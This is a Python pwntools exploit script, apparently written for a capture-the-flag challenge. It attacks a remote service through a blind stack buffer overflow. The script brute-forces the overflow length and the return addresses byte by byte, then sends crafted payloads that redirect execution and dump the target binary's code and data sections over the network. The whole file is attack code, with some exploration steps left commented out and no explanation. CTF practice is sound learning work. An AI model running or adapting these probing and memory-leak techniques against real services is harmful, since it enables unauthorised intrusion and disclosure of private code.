#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"

r=remote("pwn.sixstars.team",23008)
r.recvuntil("Let's end the road of stackoverflow:")

def getbufferflow_length():
    i = 1
    while 1:
        try:
            sh = remote('pwn.sixstars.team', 23008)
            sh.recvuntil("Let's end the road of stackoverflow:")
            sh.send(i * 'a')
            output = sh.recv()
            sh.close()
            if not output.startswith('Bye!'):
                return i - 1
            else:
                i += 1
        except EOFError:
            sh.close()
            return i - 1

overflow_len = 0x2c # = getbufferflow_length()

def detect_main(buff_len=0x2c):
    length = 0
    for i in range(4):
      for j in range(256):
        sh = remote('pwn.sixstars.team', 23008)
        sh.recvuntil("Let's end the road of stackoverflow:")
        sh.send(buff_len*'a' +p64(length)[:i]+ chr(j))
        try:
            sh.recvuntil("Let's end the road of stackoverflow:")
        except:
            sh.close()
        else:
            sh.close()
            length = length + j*(0x100**i)
            break
    return length

main_addr = 0x8048604 #detect_main(0x2c)
print hex(overflow_len)
print hex(main_addr)

def detect_write(buff_len=0x2c):
    length = 0
    for i in range(4):
      for j in range(256):
        sh = remote('pwn.sixstars.team', 23008)
        sh.recvuntil("Let's end the road of stackoverflow:")
        sh.send(buff_len*'a' +p64(length)[:i]+ chr(j))
        try:
            sh.recvuntil("Bye!")
        except:
            sh.close()
        else:
            sh.close()
            length = length + j*(0x100**i)
            break
    return length

#write_addr = detect_write(overflow_len)

lis = {'0x3a': '\xe0\x81w\xf7', '0x17': "Let's end the road of stackoverflow:", '0x7': "Let's end the road of stackoverflow:", '0x35': 'Bye!\n', '0x37': 'g\xfar\xf7~\xfar\xf7\x01\n', '0x1a': "Let's end the road of stackoverflow:", '0x32': 'Bye!\n', '0x2a': "Let's end the road of stackoverflow:", '0x38': '\xe0Ay\xf7', '0x2d': "Let's end the road of stackoverflow:"}

payload = 'a'*0x2c + p32(0x8048637)  + p32(0x8048000)


r.sendline(payload)
ww = r.recv()
print ww


def leak_elf(ret_addr=0x8048637 ,text_addr=0x8048000,length=0x900, payload=0x2c*'a'):
    elf_file = ''
    pos=0x000
    while pos < length:
        sh = remote('pwn.sixstars.team', 23008)
        sh.recvuntil("Let's end the road of stackoverflow:")
        sh.sendline(payload + p32(ret_addr) + p32(text_addr+pos))
        elf_sec = sh.recv()
        if elf_sec[-1]=='\n':
           elf_sec=elf_sec[:-1]
        sh.close()

        if elf_sec:
          elf_file +=elf_sec
          print elf_sec.encode('hex')
          pos += len(elf_sec)
        else:
          elf_file += '\x00'
          pos += 1
    return elf_file
'''
elf_file = leak_elf(0x8048637, 0x8048000, 0x2c*'a')
with open('elf_text','w' ) as f:
    f.write(elf_file)
    f.close()
'''

elf_file2= leak_elf(0x8048637, 0x8049000, 0x900,0x2c*'a')
with open('elf_rodata','w') as f:
    f.write(elf_file2)
    f.close()
 
'''
elf_file= leak_elf(0x8048637, 0x8048000,0x900, 0x2c*'a')
elf_file+=leak_elf(0x8048637, 0x8049000,0x900, 0x2c*'a')
elf_file+=leak_elf(0x8048637, 0x804a000, 0x080, 0x2c*'a')
with open('elf','w') as f:
    f.write(elf_file)
    f.close()
'''
elf_file=''
f1= open("elf_text",'r')
elf_file+=f1.read()[:-1]
f2= open("elf_rodata",'r')
elf_file+=f2.read()[:-1]
f3= open("elf_bss", 'r')
elf_file+=f3.read()[:-1]


f1.close()
f2.close()
f3.close()
with open('elf','w') as f:
   f.write(elf_file)
   f.close()

print "flag"
'''
for j in range(5,256):
    sh = remote('pwn.sixstars.team', 23008)
    sh.recvuntil("Let's end the road of stackoverflow:")
    sh.send(0x2c*'a' + chr(j))
    try:
        w=sh.recv()
        print w
    except:
        sh.close()
    else:
        sh.close()
        lis[hex(j)]=w
'''

#print lis
'''
1. addr of main
2. addr of write
3. get the .text
'''

